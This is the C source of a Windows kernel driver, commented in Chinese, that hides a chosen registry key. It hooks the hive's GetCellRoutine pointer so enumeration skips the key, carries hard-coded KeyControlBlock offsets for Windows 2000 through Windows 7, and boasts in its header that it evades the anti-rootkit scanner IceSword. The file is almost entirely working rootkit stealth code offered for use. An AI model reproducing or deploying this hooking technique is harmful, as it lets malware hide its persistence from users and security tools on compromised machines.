/******************************************************************************
**
**  FileName    :   HideRegKey.c
**  Version     :   0.10
**  Author      :   embedlinux(E-mai:hqulyc@126.com QQ:5054-3533)
**  Date        :   2008-08-04
**  Comment     :   一段隐藏注册表项的驱动代码，可以过目前最新的IceSword1.22
**
******************************************************************************/

#include "HideRegKey.h"

//定义全局变量
PGET_CELL_ROUTINE  OrigGetCellRoutine = NULL;
PGET_CELL_ROUTINE *OrigGetCellRoutineAddr = NULL;
PCM_KEY_NODE   g_HideNode = NULL;
PCM_KEY_NODE   g_LastNode = NULL;

//打开指定名字的Key
HANDLE OpenKeyByName(PCWSTR pwcsKeyName)
{
   NTSTATUS ntStatus;
   UNICODE_STRING KeyNameUnicodeString;
   OBJECT_ATTRIBUTES ObjectAttributes;
   HANDLE hKey;

   RtlInitUnicodeString(&KeyNameUnicodeString, pwcsKeyName);
   InitializeObjectAttributes(
       &ObjectAttributes, 
       &KeyNameUnicodeString, 
       OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 
       NULL,  //RootDirectory
       NULL); //SecurityDescriptor
   
   //Opens an existing registry key.
   //ntStatus = ZwOpenKey(&hKey, KEY_READ, &ObjectAttributes);
   ntStatus = ZwCreateKey(
       &hKey, 
       KEY_READ, 
       &ObjectAttributes,
       0,
       NULL,
       REG_OPTION_NON_VOLATILE,
       NULL);
   if ( !NT_SUCCESS(ntStatus) )
   {
      //这里需要修改
      DbgPrint("ZwCreateKey Failed: %lx\n", ntStatus);
      return NULL;
   }
   return hKey;
}

//获取指定Key句柄的KeyControlBlock
PVOID GetKeyControlBlock(HANDLE hKey)
{
   NTSTATUS ntStatus;
   PCM_KEY_BODY pKeyBody;
   PVOID KeyControlBlock;

   if (hKey == NULL) 
   	  return NULL;

   // 由Key句柄获取对象体
   ntStatus = ObReferenceObjectByHandle(hKey, 
       KEY_READ,   //DesiredAccess
       NULL,       //ObjectType
       KernelMode, //AccessMode
       &pKeyBody, 
       NULL);
   if (!NT_SUCCESS(ntStatus))
   {
      DbgPrint("ObReferenceObjectByHandle Failed: %lx\n",ntStatus);
      return NULL;
   }

   // 对象体中含有KeyControlBlock
   KeyControlBlock = pKeyBody->KeyControlBlock;
   KdPrint(("KeyControlBlock = %lx\n", KeyControlBlock));

   ObDereferenceObject(pKeyBody);

   return KeyControlBlock;
}

//获取父键的最后一个子键的节点(不好看懂！)
PVOID GetLastKeyNode(PVOID Hive, PCM_KEY_NODE Node)
{
   //获取父键的节点
   PCM_KEY_NODE ParentNode = (PCM_KEY_NODE)OrigGetCellRoutine(
                             Hive, Node->Parent);
   //获取子键的索引
   PCM_KEY_INDEX Index = (PCM_KEY_INDEX)OrigGetCellRoutine(
                  Hive, ParentNode->SubKeyLists[0]);

   KdPrint(("ParentNode = %lx\nIndex = %lx\n", ParentNode, Index));

   // 如果为根(二级)索引，获取最后一个索引
   if (Index->Signature == CM_KEY_INDEX_ROOT)
   {
      Index = (PCM_KEY_INDEX)OrigGetCellRoutine(Hive, Index->List[Index->Count-1]);
      
      KdPrint(("Index = %lx\n", Index));
   }

   if ( Index->Signature == CM_KEY_FAST_LEAF || 
   	    Index->Signature == CM_KEY_HASH_LEAF)
   {
      //快速叶索引(2k)或散列叶索引(XP/2k3)，返回最后的节点
      return OrigGetCellRoutine(Hive, Index->List[2*(Index->Count-1)]);
   }
   else
   {
      //一般叶索引，返回最后的节点
      return OrigGetCellRoutine(Hive, Index->List[Index->Count-1]);
   }
}

//GetCell例程的钩子函数
PVOID HookGetCellRoutine(PVOID Hive, HANDLE Cell)
{
   // 调用原函数
   PVOID pRet = OrigGetCellRoutine(Hive, Cell);
   if (pRet)
   {
      // 返回的是需要隐藏的节点
      if (pRet == g_HideNode)
      {
         KdPrint(("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet));
         //查询、保存并返回其父键的最后一个子键的节点
         pRet = g_LastNode = (PCM_KEY_NODE)GetLastKeyNode(
                              Hive, g_HideNode);
         KdPrint(("g_LastNode = %lx\n", g_LastNode));
         //隐藏的正是最后一个节点，返回空值
         if (pRet == g_HideNode) 
             pRet = NULL;
      }
      // 返回的是先前保存的最后一个节
      else if (pRet == g_LastNode)
      {
         KdPrint(("GetCellRoutine(%lx, %08lx) = %lx\n", Hive, Cell, pRet));
         // 清空保存值，并返回空值
         pRet = g_LastNode = NULL;
      }
   }
   return pRet;
}

VOID UnHideRegKey()
{
	 if (OrigGetCellRoutineAddr) 
      *OrigGetCellRoutineAddr = OrigGetCellRoutine;
      
   KdPrint(("UnHideRegKey\n"));
}

//隐藏指定的注册表键
NTSTATUS HideRegKey(IN PWCHAR HideKeyName)
{
   ULONG BuildNumber;
   ULONG KeyHiveOffset; //KeyControlBlock->KeyHive
   ULONG KeyCellOffset; //KeyControlBlock->KeyCell
   HANDLE hKey;
   PVOID KCB, Hive;

   // 查询BuildNumber
   if (PsGetVersion(NULL, NULL, &BuildNumber, NULL)) 
      return STATUS_NOT_SUPPORTED;
      
   KdPrint(("BuildNumber = %d\n", BuildNumber));

   //KeyControlBlock结构各版本略有不同
   //Cell的值一般小于0x80000000，而Hive正相反，以此来判断也可以
   switch (BuildNumber)
   {
   case 2195: // Win2000
      KeyHiveOffset = 0xc;
      KeyCellOffset = 0x10;
      break;
   case 2600: // WinXP
   case 3790: // Win2003
      KeyHiveOffset = 0x10;
      KeyCellOffset = 0x14;
      break;
   case 7600:	//Win7 Undone
	  KeyHiveOffset = 0x10;
      KeyCellOffset = 0x14;
      break;
   default:
      return STATUS_NOT_SUPPORTED;
      break;
   }

   //打开需隐藏的键
   hKey = OpenKeyByName(HideKeyName);
   //获取该键的KeyControlBlock
   KCB = GetKeyControlBlock(hKey);
   if (KCB)
   {
      //由KCB得到Hive
      PHHIVE Hive = (PHHIVE)GET_PTR(KCB, KeyHive);
      
      //GetCellRoutine在KCB中，保存原地址
      OrigGetCellRoutineAddr = &Hive->GetCellRoutine;
      OrigGetCellRoutine     = Hive->GetCellRoutine;
      KdPrint(("GetCellRoutine = %lx\n", OrigGetCellRoutine));
      
      //获取需隐藏的节点并保存
      g_HideNode = (PCM_KEY_NODE)OrigGetCellRoutine(Hive, GET_PTR(KCB, KeyCell));
      //挂钩GetCell例程
      
      //InterlockedExchange(&Hive->GetCellRoutine, &HookGetCellRoutine);
      Hive->GetCellRoutine = HookGetCellRoutine;
   }
   ZwClose(hKey);
   
   return STATUS_SUCCESS;
}
